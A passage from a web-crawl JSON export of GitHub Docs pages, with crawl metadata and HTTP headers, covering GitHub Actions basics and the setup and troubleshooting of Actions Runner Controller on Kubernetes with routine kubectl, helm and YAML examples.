   gha-runner-scale-set-0.4.0                  0.4.0\n    ```\n    \n3.  To check the manager pod, run the following command in your terminal.\n    \n    Bash\n    \n    ```\n    kubectl get pods -n arc-systems\n    ```\n    \n    If everything was installed successfully, the status of the pods shows as **Running**.\n    \n    ```\n    NAME                                                   READY   STATUS    RESTARTS   AGE\n    arc-gha-runner-scale-set-controller-594cdc976f-m7cjs   1/1     Running   0          64s\n    arc-runner-set-754b578d-listener                       1/1     Running   0          12s\n    ```\n    \n\nIf your installation was not successful, see [Troubleshooting Actions Runner Controller errors](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors) for troubleshooting information.\n\n## [Using runner scale sets](#using-runner-scale-sets)\n\nNow you will create and run a simple test workflow that uses the runner scale set runners.\n\n1.  In a repository, create a workflow similar to the following example. The `runs-on` value should match the Helm installation name you used when you installed the autoscaling runner set.\n    \n    For more information on adding workflows to a repository, see [Quickstart for GitHub Actions](https://docs.github.com/en/actions/quickstart#creating-your-first-workflow).\n    \n    YAML\n    \n    ```\n    name: Actions Runner Controller Demo\n    on:\n      workflow_dispatch:\n    \n    jobs:\n      Explore-GitHub-Actions:\n        # You need to use the INSTALLATION_NAME from the previous step\n        runs-on: arc-runner-set\n        steps:\n        - run: echo \"🎉 This job uses runner scale set runners!\"\n    ```\n    \n2.  Once you've added the workflow to your repository, manually trigger the workflow. For more information, see [Manually running a workflow](https://docs.github.com/en/actions/managing-workflow-runs/manually-running-a-workflow).\n    \n3.  To view the runner pods being created while the workflow is running, run the following command from your terminal.\n    \n    Bash\n    \n    ```\n    kubectl get pods -n arc-runners\n    ```\n    \n    A successful output will look similar to the following.\n    \n    ```\n    NAMESPACE     NAME                                                  READY   STATUS    RESTARTS      AGE\n    arc-runners   arc-runner-set-rmrgw-runner-p9p5n                     1/1     Running   0             21s\n    ```\n    \n\n## [Next steps](#next-steps)\n\nActions Runner Controller can help you efficiently manage your GitHub Actions runners. Ready to get started? Here are some helpful resources for taking your next steps with ARC:\n\n*   For detailed authentication information, see [Authenticating to the GitHub API](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api).\n*   For help using ARC runners in your workflows, see [Using Actions Runner Controller runners in a workflow](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/using-actions-runner-controller-runners-in-a-workflow).\n*   For deployment information, see [Deploying runner scale sets with Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller).\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/actions/actions-runner-controller/](https://github.com/actions/actions-runner-controller/) under the Apache-2.0 license:\n\n```\nCopyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 263,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner-",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner-",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner-",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner-",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-quickstart-for-actions-runner-"
    },
    "lengths": {
      "extractus": 14489,
      "readableText": 13160,
      "none": 38570,
      "readableTextIfPossible": 13160,
      "result": 13160,
      "markdown": 11505
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/about-github-actions/understanding-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/about-github-actions/understanding-github-actions",
    "loadedTime": "2025-05-08T06:42:57.530Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/about-github-actions/understanding-github-actions",
    "title": "Understanding GitHub Actions - GitHub Docs",
    "description": "Learn the basics of GitHub Actions, including core concepts and essential terminology.",
    "author": null,
    "keywords": "Fundamentals",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Understanding GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/about-github-actions/understanding-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/about-github-actions/understanding-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "2DF7:14CFDE:BA9BD0:F507C9:681C5266",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:48 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686568.028127, VS0, VE314",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26888",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Understanding GitHub Actions - GitHub Docs\nLearn the basics of GitHub Actions, including core concepts and essential terminology.\nOverview\nGitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that build and test every pull request to your repository, or deploy merged pull requests to production.\nGitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.\nGitHub provides Linux, Windows, and macOS virtual machines to run your workflows, or you can host your own self-hosted runners in your own data center or cloud infrastructure.\nThe components of GitHub Actions\nYou can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened or an issue being created. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.\nWorkflows\nA workflow is a configurable automated process that will run one or more jobs. Workflows are defined by a YAML file checked in to your repository and will run when triggered by an event in your repository, or they can be triggered manually, or at a defined schedule.\nWorkflows are defined in the .github/workflows directory in a repository. A repository can have multiple workflows, each of which can perform a different set of tasks such as:\nBuilding and testing pull requests\nDeploying your application every time a release is created\nAdding a label whenever a new issue is opened\nYou can reference a workflow within another workflow. For more information, see Reusing workflows.\nFor more information, see Writing workflows.\nEvents\nAn event is a specific activity in a repository that triggers a workflow run. For example, an activity can originate from GitHub when someone creates a pull request, opens an issue, or pushes a commit to a repository. You can also trigger a workflow to run on a schedule, by posting to a REST API, or manually.\nFor a complete list of events that can be used to trigger workflows, see Events that trigger workflows.\nJobs\nA job is a set of steps in a workflow that is executed on the same runner. Each step is either a shell script that will be executed, or an action that will be run. Steps are executed in order and are dependent on each other. Since each step is executed on the same runner, you can share data from one step to another. For example, you can have a step that builds your application followed by a step that tests the application that was built.\nYou can configure a job's dependencies with other jobs; by default, jobs have no dependencies and run in parallel. When a job takes a dependency on another job, it waits for the dependent job to complete before running.\nFor example, you might configure multiple build jobs for different architectures without any job dependencies and a packaging job that depends on those builds. The build jobs run in parallel, and once they complete successfully, the packaging job runs.\nFor more information, see Choosing what your workflow does.\nActions\nAn action is a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Use an action to help reduce the amount of repetitive code that you write in your workflow files. An action can pull your Git repository from GitHub, set up the correct toolchain for your build environment, or set up the authentication to your cloud provider.\nYou can write your own actions, or you can find actions to use in your workflows in the GitHub Marketplace.\nFor more information on actions, see Sharing automations.\nRunners\nA runner is a server that runs your workflows when they're triggered. Each runner can run a single job at a time. GitHub provides Ubuntu Linux, Microsoft Windows, and macOS runners to run your workflows. Each workflow run executes in a fresh, newly-provisioned virtual machine.\nGitHub also offers larger runners, which are available in larger configurations. For more information, see Using larger runners.\nIf you need a different operating system or require a specific hardware configuration, you can host your own runners.\nFor more information about self-hosted runners, see Hosting your own runners.\nNext steps\nGitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:\nTo create a GitHub Actions workflow, see Using workflow templates.\nFor continuous integration (CI) workflows, see Building and testing.\nFor building and publishing packages, see Publishing packages.\nFor deploying projects, see Use cases and examples.\nFor automating tasks and processes on GitHub, see Managing projects.\nFor examples that demonstrate more complex features of GitHub Actions, see Use cases and examples. These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.\nTo certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, see About GitHub Certifications.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-xqn3k.html",
  "markdown": "# Understanding GitHub Actions - GitHub Docs\n\nLearn the basics of GitHub Actions, including core concepts and essential terminology.\n\n## [Overview](#overview)\n\nGitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline. You can create workflows that build and test every pull request to your repository, or deploy merged pull requests to production.\n\nGitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.\n\nGitHub provides Linux, Windows, and macOS virtual machines to run your workflows, or you can host your own self-hosted runners in your own data center or cloud infrastructure.\n\n## [The components of GitHub Actions](#the-components-of-github-actions)\n\nYou can configure a GitHub Actions **workflow** to be triggered when an **event** occurs in your repository, such as a pull request being opened or an issue being created. Your workflow contains one or more **jobs** which can run in sequential order or in parallel. Each job will run inside its own virtual machine **runner**, or inside a container, and has one or more **steps** that either run a script that you define or run an **action**, which is a reusable extension that can simplify your workflow.\n\n![Diagram of an event triggering Runner 1 to run Job 1, which triggers Runner 2 to run Job 2. Each of the jobs is broken into multiple steps.](https://docs.github.com/assets/cb-25535/images/help/actions/overview-actions-simple.png)\n\n### [Workflows](#workflows)\n\nA **workflow** is a configurable automated process that will run one or more jobs. Workflows are defined by a YAML file checked in to your repository and will run when triggered by an event in your repository, or they can be triggered manually, or at a defined schedule.\n\nWorkflows are defined in the `.github/workflows` directory in a repository. A repository can have multiple workflows, each of which can perform a different set of tasks such as:\n\n*   Building and testing pull requests\n*   Deploying your application every time a release is created\n*   Adding a label whenever a new issue is opened\n\nYou can reference a workflow within another workflow. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\nFor more information, see [Writing workflows](https://docs.github.com/en/actions/using-workflows).\n\n### [Events](#events)\n\nAn **event** is a specific activity in a repository that triggers a **workflow** run. For example, an activity can originate from GitHub when someone creates a pull request, opens an issue, or pushes a commit to a repository. You can also trigger a workflow to run on a [schedule](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#schedule), by [posting to a REST API](https://docs.github.com/en/rest/repos/repos#create-a-repository-dispatch-event), or manually.\n\nFor a complete list of events that can be used to trigger workflows, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows).\n\n### [Jobs](#jobs)\n\nA **job** is a set of **steps** in a workflow that is executed on the same **runner**. Each step is either a shell script that will be executed, or an **action** that will be run. Steps are executed in order and are dependent on each other. Since each step is executed on the same runner, you can share data from one step to another. For example, you can have a step that builds your application followed by a step that tests the application that was built.\n\nYou can configure a job's dependencies with other jobs; by default, jobs have no dependencies and run in parallel. When a job takes a dependency on another job, it waits for the dependent job to complete before running.\n\nFor example, you might configure multiple build jobs for different architectures without any job dependencies and a packaging job that depends on those builds. The build jobs run in parallel, and once they complete successfully, the packaging job runs.\n\nFor more information, see [Choosing what your workflow does](https://docs.github.com/en/actions/using-jobs).\n\n### [Actions](#actions)\n\nAn **action** is a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Use an action to help reduce the amount of repetitive code that you write in your **workflow** files. An action can pull your Git repository from GitHub, set up the correct toolchain for your build environment, or set up the authentication to your cloud provider.\n\nYou can write your own actions, or you can find actions to use in your workflows in the GitHub Marketplace.\n\nFor more information on actions, see [Sharing automations](https://docs.github.com/en/actions/creating-actions).\n\n### [Runners](#runners)\n\nA **runner** is a server that runs your workflows when they're triggered. Each runner can run a single **job** at a time. GitHub provides Ubuntu Linux, Microsoft Windows, and macOS runners to run your **workflows**. Each workflow run executes in a fresh, newly-provisioned virtual machine.\n\nGitHub also offers larger runners, which are available in larger configurations. For more information, see [Using larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners).\n\nIf you need a different operating system or require a specific hardware configuration, you can host your own runners.\n\nFor more information about self-hosted runners, see [Hosting your own runners](https://docs.github.com/en/actions/hosting-your-own-runners).\n\n## [Next steps](#next-steps)\n\nGitHub Actions can help you automate nearly every aspect of your application development processes. Ready to get started? Here are some helpful resources for taking your next steps with GitHub Actions:\n\n*   To create a GitHub Actions workflow, see [Using workflow templates](https://docs.github.com/en/actions/learn-github-actions/using-starter-workflows).\n*   For continuous integration (CI) workflows, see [Building and testing](https://docs.github.com/en/actions/automating-builds-and-tests).\n*   For building and publishing packages, see [Publishing packages](https://docs.github.com/en/actions/publishing-packages).\n*   For deploying projects, see [Use cases and examples](https://docs.github.com/en/actions/deployment).\n*   For automating tasks and processes on GitHub, see [Managing projects](https://docs.github.com/en/actions/managing-issues-and-pull-requests).\n*   For examples that demonstrate more complex features of GitHub Actions, see [Use cases and examples](https://docs.github.com/en/actions/examples). These detailed examples explain how to test your code on a runner, access the GitHub CLI, and use advanced features such as concurrency and test matrices.\n*   To certify your proficiency in automating workflows and accelerating development with GitHub Actions, earn a GitHub Actions certificate with GitHub Certifications. For more information, see [About GitHub Certifications](https://docs.github.com/en/get-started/showcase-your-expertise-with-github-certifications/about-github-certifications).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 252,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-about-github-actions-understanding-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 9441,
      "readableText": 8714,
      "none": 27990,
      "readableTextIfPossible": 8714,
      "result": 8714,
      "markdown": 7341
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors",
    "loadedTime": "2025-05-08T06:42:58.325Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors",
    "title": "Troubleshooting Actions Runner Controller errors - GitHub Docs",
    "description": "Learn how to troubleshoot Actions Runner Controller errors.",
    "author": null,
    "keywords": "Actions Runner Controller",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Troubleshooting Actions Runner Controller errors - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BCBC:1CCE9D:B496EC:EF034B:681C526B",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:51 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686571.053475, VS0, VE356",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29227",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Troubleshooting Actions Runner Controller errors\nLearn how to troubleshoot Actions Runner Controller errors.\nLegal notice\nLogging\nThe Actions Runner Controller (ARC) resources, which include the controller, listener, and runners, write logs to standard output (stdout). We recommend you implement a logging solution to collect and store these logs. Having logs available can help you or GitHub support with troubleshooting and debugging. For more information, see Logging Architecture in the Kubernetes documentation.\nResources labels\nLabels are added to the resources created by Actions Runner Controller, which include the controller, listener, and runner pods. You can use these labels to filter resources and to help with troubleshooting.\nController pod\nThe following labels are applied to the controller pod.\napp.kubernetes.io/component=controller-manager app.kubernetes.io/instance=<controller installation name> app.kubernetes.io/name=gha-runner-scale-set-controller app.kubernetes.io/part-of=gha-runner-scale-set-controller app.kubernetes.io/version=<chart version> \nListener pod\nThe following labels are applied to listener pods.\nactions.github.com/enterprise= # Will be populated if githubConfigUrl is an enterprise URL actions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL actions.github.com/repository= # Will be populated if githubConfigUrl is a repository URL actions.github.com/scale-set-name= # Runners scale set name actions.github.com/scale-set-namespace= # Runners namespace app.kubernetes.io/component=runner-scale-set-listener app.kubernetes.io/part-of=gha-runner-scale-set app.kubernetes.io/version= # Chart version \nRunner pod\nThe following labels are applied to runner pods.\nactions-ephemeral-runner= # True | False actions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL actions.github.com/scale-set-name= # Runners scale set name actions.github.com/scale-set-namespace= # Runners namespace app.kubernetes.io/component=runner app.kubernetes.io/part-of=gha-runner-scale-set app.kubernetes.io/version= # Chart version \nChecking the logs of the controller and runner set listener\nTo check the logs of the controller pod, you can use the following command.\nBash\nkubectl logs -n <CONTROLLER_NAMESPACE> -l app.kubernetes.io/name=gha-runner-scale-set-controller \nTo check the logs of the runner set listener, you can use the following command.\nBash\nkubectl logs -n <CONTROLLER_NAMESPACE> -l auto-scaling-runner-set-namespace=arc-systems -l auto-scaling-runner-set-name=arc-runner-set \nUsing the charts from the master branch\nWe recommend you use the charts from the latest release instead of the master branch. The master branch is highly unstable, and we cannot guarantee that the charts in the master branch will work at any given time.\nTroubleshooting the listener pod\nIf the controller pod is running, but the listener pod is not, inspect the logs of the controller first and see if there are any errors. If there are no errors and the runner set listener pod is still not running, ensure the controller pod has access to the Kubernetes API server in your cluster.\nIf you have a proxy configured or you're using a sidecar proxy that's automatically injected, such as Istio, ensure it's configured to allow traffic from the controller container (manager) to the Kubernetes API server.\nIf you have installed the autoscaling runner set, but the listener pod is not created, verify that the githubConfigSecret you provided is correct and that the githubConfigUrl you provided is accurate. See Authenticating to the GitHub API and Deploying runner scale sets with Actions Runner Controller for more information.\nRunner pods are recreated after a canceled workflow run\nOnce a workflow run is canceled, the following events happen.\nThe cancellation signal is sent to the runners directly.\nThe runner application terminates, which also terminates the runner pods.\nOn the next poll, the cancellation signal is received by the listener.\nThere might be a slight delay between when the runners receive the signal and when the listener receives the signal. When runner pods start terminating, the listener tries to bring up new runners to match the desired number of runners according to the state it's in. However, when the listener receives the cancellation signal, it will act to reduce the number of runners. Eventually the listener will scale back down to the desired number of runners. In the meantime, you may see extra runners.\nError: Name must have up to n characters\nARC uses the generated names of certain resources as labels for other resources. Because of this requirement, ARC limits resource names to 63 characters.\nBecause part of the resource name is defined by you, ARC imposes a limit on the number of characters you can use for the installation name and namespace.\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:5:5): Name must have up to 45 characters Error: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:8:5): Namespace must have up to 63 characters \nYou may see this error if you're using Kubernetes mode with persistent volumes. This error occurs if the runner container is running with a non-root user and is causing a permissions mismatch with the mounted volume.\nTo fix this, you can do one of the following things.\nUse a volume type that supports securityContext.fsGroup. hostPath volumes do not support this property, whereas local volumes and other types of volumes do support it. Update the fsGroup of your runner pod to match the GID of the runner. You can do this by updating the gha-runner-scale-set helm chart values to include the following. Replace VERSION with the version of the actions-runner container image you want to use.\nYAML\nspec: securityContext: fsGroup: 123 containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] \nIf updating the securityContext of your runner pod is not a viable solution, you can work around the issue by using initContainers to change the mounted volume's ownership, as follows.\nYAML\ntemplate: spec: initContainers: - name: kube-init image: ghcr.io/actions/actions-runner:latest command: [\"sudo\", \"chown\", \"-R\", \"1001:123\", \"/home/runner/_work\"] volumeMounts: - name: work mountPath: /home/runner/_work containers: - name: runner image: ghcr.io/actions/actions-runner:latest command: [\"/home/runner/run.sh\"] \nA 401 Unauthorized error when attempting to obtain an access token for a GitHub App could be a result of a Network Time Protocol (NTP) drift. Ensure that your Kubernetes system is accurately syncing with an NTP server and that there isn't a significant time drift. There is more leeway if your system time is behind GitHub's time, but if the environment is more than a few seconds ahead, 401 errors will occur when using GitHub App.\nLegal notice\nPortions have been adapted from https://github.com/actions/actions-runner-controller/ under the Apache-2.0 license:\nCopyright 2019 Moto Ishizawa Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner-gge68.html",
  "markdown": "# Troubleshooting Actions Runner Controller errors\n\nLearn how to troubleshoot Actions Runner Controller errors.\n\n[Legal notice](#legal-notice)\n\n## [Logging](#logging)\n\nThe Actions Runner Controller (ARC) resources, which include the controller, listener, and runners, write logs to standard output (`stdout`). We recommend you implement a logging solution to collect and store these logs. Having logs available can help you or GitHub support with troubleshooting and debugging. For more information, see [Logging Architecture](https://kubernetes.io/docs/concepts/cluster-administration/logging/) in the Kubernetes documentation.\n\n## [Resources labels](#resources-labels)\n\nLabels are added to the resources created by Actions Runner Controller, which include the controller, listener, and runner pods. You can use these labels to filter resources and to help with troubleshooting.\n\n### [Controller pod](#controller-pod)\n\nThe following labels are applied to the controller pod.\n\n```\napp.kubernetes.io/component=controller-manager\napp.kubernetes.io/instance=<controller installation name>\napp.kubernetes.io/name=gha-runner-scale-set-controller\napp.kubernetes.io/part-of=gha-runner-scale-set-controller\napp.kubernetes.io/version=<chart version>\n```\n\n### [Listener pod](#listener-pod)\n\nThe following labels are applied to listener pods.\n\n```\nactions.github.com/enterprise= # Will be populated if githubConfigUrl is an enterprise URL\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/repository= # Will be populated if githubConfigUrl is a repository URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner-scale-set-listener\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version\n```\n\n### [Runner pod](#runner-pod)\n\nThe following labels are applied to runner pods.\n\n```\nactions-ephemeral-runner= # True | False\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version\n```\n\n## [Checking the logs of the controller and runner set listener](#checking-the-logs-of-the-controller-and-runner-set-listener)\n\nTo check the logs of the controller pod, you can use the following command.\n\nBash\n\n```\nkubectl logs -n <CONTROLLER_NAMESPACE> -l app.kubernetes.io/name=gha-runner-scale-set-controller\n```\n\nTo check the logs of the runner set listener, you can use the following command.\n\nBash\n\n```\nkubectl logs -n <CONTROLLER_NAMESPACE> -l auto-scaling-runner-set-namespace=arc-systems -l auto-scaling-runner-set-name=arc-runner-set\n```\n\n## [Using the charts from the `master` branch](#using-the-charts-from-the-master-branch)\n\nWe recommend you use the charts from the latest release instead of the `master` branch. The `master` branch is highly unstable, and we cannot guarantee that the charts in the `master` branch will work at any given time.\n\n## [Troubleshooting the listener pod](#troubleshooting-the-listener-pod)\n\nIf the controller pod is running, but the listener pod is not, inspect the logs of the controller first and see if there are any errors. If there are no errors and the runner set listener pod is still not running, ensure the controller pod has access to the Kubernetes API server in your cluster.\n\nIf you have a proxy configured or you're using a sidecar proxy that's automatically injected, such as [Istio](https://istio.io/), ensure it's configured to allow traffic from the controller container (manager) 